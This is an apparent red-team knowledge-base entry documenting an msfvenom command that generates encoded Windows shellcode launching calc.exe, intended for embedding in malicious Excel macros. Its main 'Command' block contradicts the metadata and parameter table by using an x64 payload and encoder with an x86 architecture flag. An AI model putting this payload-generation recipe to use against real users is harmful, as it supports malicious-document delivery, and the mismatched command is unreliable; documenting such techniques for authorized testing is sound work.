---
id: 5573ec8b-ce71-4ad0-a14f-982d17dde61c-1
name: msfvenom-generate-x86-calc-shellcode
type: command
executor: bash
data: >-
  msfvenom -a x86 -b '\x00' --platform windows -p windows/exec cmd=calc.exe -e
  x86/alpha_mixed -f raw EXITFUNC=thread > popcalc.bin
output: null
created_at: '2023-04-06T03:56:23.232564+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - payload-generation
  - msfvenom
verified: true
validated: true
---

# msfvenom-generate-x86-calc-shellcode

## Command

```bash
msfvenom -a x86 -b '\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin
```

## Description

Generates a 32-bit Windows shellcode payload that executes calc.exe using alpha_mixed encoding to avoid null bytes. Output is redirected to popcalc.bin for use in macro embedding.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -a x86 | Architecture: 32-bit | Yes |
| -b '\x00' | Avoid null bytes in output | Yes |
| --platform windows | Target platform | Yes |
| -p windows/exec | Payload type: execute command | Yes |
| cmd=calc.exe | Command to execute | Yes |
| -e x86/alpha_mixed | Encoder for alphanumeric output | Yes |
| -f raw | Output format: raw binary | Yes |
| EXITFUNC=thread | Exit function for threaded execution | Yes |
| > popcalc.bin | Redirect to file | Yes |

## Examples

### Basic Usage

```bash
msfvenom -a x86 -b '\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread > popcalc.bin
```

## Expected Output

No console output; creates popcalc.bin (~500 bytes). Verify with `ls -la popcalc.bin` or `hexdump -C popcalc.bin` to see encoded shellcode.

## Related

- [[procedures/Create-Malicious-Macro-Enabled-Excel-Documents-with-Macrome]]
- [[tools/msfvenom]]
